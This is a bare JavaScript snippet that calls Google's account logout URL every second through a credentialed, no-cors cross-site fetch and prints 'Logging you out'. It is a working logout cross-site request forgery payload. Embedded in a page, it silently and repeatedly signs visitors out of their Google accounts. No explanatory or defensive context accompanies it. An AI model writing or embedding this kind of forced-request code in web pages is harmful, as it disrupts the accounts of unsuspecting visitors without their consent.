setInterval(function(){
    fetch("https://www.google.com/accounts/Logout",{
  credentials: 'include',
  mode: 'no-cors', // no-cors
})
    console.log("Logging you out");
},1000)
